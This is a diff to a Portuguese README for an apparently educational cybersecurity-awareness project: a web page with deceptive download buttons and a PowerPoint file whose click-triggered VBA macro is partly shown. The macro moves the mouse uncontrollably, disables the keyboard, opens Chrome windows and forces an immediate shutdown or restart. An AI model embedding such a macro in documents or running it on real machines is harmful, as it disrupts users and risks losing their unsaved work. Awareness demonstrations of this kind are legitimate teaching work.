@@ -27,7 +27,9 @@ O site foi criado para ser interativo e educacional. Ao acessar a página, o usu
 
 Ao clicar no botão principal, o botão desaparece em forma de fumaça e é substituído por vários outros botões dispostos de maneira aleatória.
 
-Enganação Intencional: Esses novos botões parecem oferecer a opção de download, mas ao tentar clicar neles, eles se movem rapidamente de forma aleatória para impedir que o usuário os clique. Isso foi feito para simular uma experiência de ataque frustrante ou enganosa, comum em cenários de engenharia social.
+- **Enganação Intencional:** 
+
+Esses novos botões parecem oferecer a opção de download, mas ao tentar clicar neles, eles se movem rapidamente de forma aleatória para impedir que o usuário os clique. Isso foi feito para simular uma experiência de ataque frustrante ou enganosa, comum em cenários de engenharia social.
 
 
 - **Acesso ao Arquivo:**
@@ -44,9 +46,13 @@ Importante: Para acessar o conteúdo da simulação, o usuário deve baixar o ar
 Este projeto foi desenvolvido com as seguintes tecnologias:
 
 - **HTML5**: A estrutura da página foi criada utilizando HTML5, a última versão da linguagem de marcação padrão para a criação de páginas web.
+
 - **CSS3**: O layout e o estilo visual foram implementados com CSS3, permitindo uma personalização sofisticada e responsiva.
+  
 - **JavaScript**: A lógica interativa e os efeitos dinâmicos foram programados em JavaScript, proporcionando uma experiência de usuário avançada e imersiva.
+  
 - **VBA Macros**: Utilizado no PowerPoint para criar uma simulação de ataque.
+  
 
 ## 📂 Estrutura do Projeto
 
@@ -69,7 +75,7 @@ fontesenai/
 ```
 ## 📜 Instruções para Execução do PowerPoint
 
-Ambiente Controlado:
+- **Ambiente Controlado**
 
 **Acessar a Página:** [Aqui](https://d3z33.github.io/fontesenai/) para abrir a página do projeto.
 
@@ -82,13 +88,14 @@ Execução da Macro:
 
 A partir do slide 3 do arquivo PowerPoint, qualquer clique no slide aciona a macro. Isso simula um ataque, causando uma série de ações no sistema, como o movimento descontrolado do mouse, desativação do teclado, abertura de janelas e, por fim, a reinicialização ou desligamento do computador.
 
-** 🎯 Objetivo do Projeto**
+## 🎯 Objetivo do Projeto**
 
 O objetivo deste projeto é educar e conscientizar os participantes sobre os riscos de segurança na internet. A simulação de um ataque mostra como um cenário realista pode ser perigoso e ilustra a importância da cibersegurança.
 
 ## 💻 Código da Macro (VBA) no PowerPoint
 
 Abaixo está o código da macro VBA que simula o ataque:
+
 ```bash
 ' Importa as funções da biblioteca "user32" para mover o cursor do mouse
 Declare PtrSafe Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
@@ -120,8 +127,10 @@ Sub ExecutarSimulacao()
     ' Faz o cursor do mouse se mover de forma descontrolada em um padrão circular
     Dim i As Long
     For i = 1 To 1000
+
         ' Calcula a posição do mouse baseada no cosseno e seno para criar o movimento circular
         SetCursorPos (GetSystemMetrics(0) / 2) + 50 * Cos(i), (GetSystemMetrics(1) / 2) + 50 * Sin(i)
+
         ' Pausa de 1 milissegundo entre cada movimento do mouse para criar fluidez
         Sleep 1
     Next i
@@ -138,8 +147,10 @@ Sub ExecutarSimulacao()
 
     ' Abre cada URL em uma nova janela do Chrome, com um pequeno atraso entre cada uma
     For j = 0 To UBound(urls)
+
         ' Abre o Chrome em uma nova janela maximizada com a URL correspondente
         ShellExecute 0, "open", "chrome.exe", "--start-maximized --new-window " & urls(j), vbNullString, vbNormalFocus
+
         ' Pausa de 1200 milissegundos (1,2 segundos) entre a abertura de cada aba
         Sleep 1200
     Next j
@@ -152,6 +163,7 @@ Sub ExecutarSimulacao()
 
     ' Escolhe aleatoriamente entre desligar ou reiniciar o sistema
     Randomize
+
     If Rnd < 0.5 Then
         ' Desliga o sistema imediatamente
         Shell "shutdown -s -f -t 0", vbHide  ' Desligar
@@ -163,13 +175,15 @@ End Sub
 ```
 
 ## 🛠️ Instruções Gerais
-Execução Manual Não Recomendada: A simulação é programada para ser automática. Caso as macros não sejam executadas corretamente, a simulação não terá efeito.
 
-Ambiente Seguro: Para evitar problemas, execute este teste em um ambiente seguro ou em máquinas virtuais.
+- **Execução Manual Não Recomendada:**
+   A simulação é programada para ser automática. Caso as macros não sejam executadas corretamente, a simulação não terá efeito.
 
-Desempenho do Sistema: Durante a execução da macro, o sistema pode sofrer impacto no desempenho, como fechamento de aplicações e reinicialização do sistema.
+- **Ambiente Seguro:**
+Para evitar problemas, execute este teste em um ambiente seguro ou em máquinas virtuais.
 
-## ⌨️ com ❤️ por [D3Z33] 🧑‍💻 🎓
+- **Desempenho do Sistema:**
+Durante a execução da macro, o sistema pode sofrer impacto no desempenho, como fechamento de aplicações e reinicialização do sistema.
 
 
 ### Explicações:
@@ -181,3 +195,5 @@ Desempenho do Sistema: Durante a execução da macro, o sistema pode sofrer impa
 - **Estrutura do Projeto**: Descrição da estrutura de diretórios para facilitar a compreensão do projeto.
 
 - **Objetivo e Instruções**: Uma seção clara sobre o propósito do projeto e como utilizá-lo.
+
+## ⌨️ com ❤️ por [D3Z33] 🧑‍💻 🎓
